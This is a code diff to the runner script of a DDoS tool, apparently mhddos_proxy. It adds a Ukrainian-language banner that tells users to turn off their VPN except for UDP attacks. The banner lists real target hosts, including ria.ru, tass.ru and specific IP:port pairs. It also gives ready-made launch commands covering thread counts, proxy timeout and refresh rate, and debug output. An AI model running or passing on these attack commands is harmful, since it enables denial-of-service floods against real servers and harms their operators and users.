@@ -167,8 +167,33 @@ def init_argparse() -> argparse.ArgumentParser:
     return parser
 
 
+def print_banner():
+    print('''\
+                            !!!ВИМКНІТЬ VPN!!!  (окрім UDP атак)
+     (скрипт автоматично підбирає проксі, VPN тільки заважає як додатковий прошарок)
+# Варіанти цілей
+- URL         https://ria.ru
+- IP + PORT   5.188.56.124:3606
+- TCP         tcp://194.54.14.131:22
+- UDP         udp://217.175.155.100:53 - !!!ДЛЯ ЦЬОГО ПОТРІБЕН VPN!!!
+# Конфігурація. Усі параметри можна комбінувати, можна вказувати і до і після переліку цілей.
+Для Docker замініть `python3 runner.py` на `docker run -it --rm portholeascend/mhddos_proxy`
+- Повна документація - `python3 runner.py --help` 
+- Навантаження - `-t XXX` - кількість потоків на кожне ядро CPU, за замовчуванням - 300
+    python3 runner.py -t 500 https://ria.ru https://tass.ru
+- Інформація про хід атаки - прапорець `--debug`
+    python3 runner.py --debug https://ria.ru https://tass.ru
+- Більше проксі (можливо, гіршої якості) - `--proxy-timeout SECONDS`
+    python3 runner.py --proxy-timeout 5 https://ria.ru https://tass.ru
+- Частота оновлення проксі (за замовчуванням - кожні 5 хвилин) - `-p SECONDS`
+    python3 runner.py -p 600 https://ria.ru https://tass.ru
+                          !!!ВИМКНІТЬ VPN!!!  (окрім UDP атак)
+    ''')
+
+
 if __name__ == '__main__':
     args = init_argparse().parse_args()
+    print_banner()
     start(
         args.threads * multiprocessing.cpu_count(),
         args.period,
